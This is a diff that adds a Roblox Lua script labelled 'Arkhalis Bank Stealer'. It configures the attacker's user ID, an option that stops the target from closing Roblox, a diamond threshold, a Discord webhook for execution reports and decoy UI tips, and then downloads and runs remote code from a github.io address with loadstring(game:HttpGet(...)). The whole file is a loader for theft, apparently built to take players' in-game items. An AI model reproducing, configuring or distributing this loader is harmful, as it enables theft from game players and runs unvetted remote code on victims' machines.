@@ -1,0 +1,23 @@
+--[[ Arkhalis Bank Stealer]]--
+
+
+--[[ Main Config ]]--
+_G.UserId = 69420 --// Roblox Account Id [[https://www.roblox.com/users/IDHERE/profile]] <- This is a example
+
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Diamonds = 100000 --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+_G.Webhook = "" --// Discord link Webhook For Executions
+    
+--[[ UI Config ]]--
+_G.ScriptName = "test" --// Script Name On The UI
+_G.Tip1 = "test" --// Gives You Tips On The UI
+_G.Tip2 = "test" --// Gives You Tips On The UI
+_G.Tip3 = "test" --// Gives You Tips On The UI
+_G.Tip4 = "" --// Gives You Tips On The UI
+_G.Tip5 = "test" --// Gives You Tips On The UI
+
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisBank.lua"))()
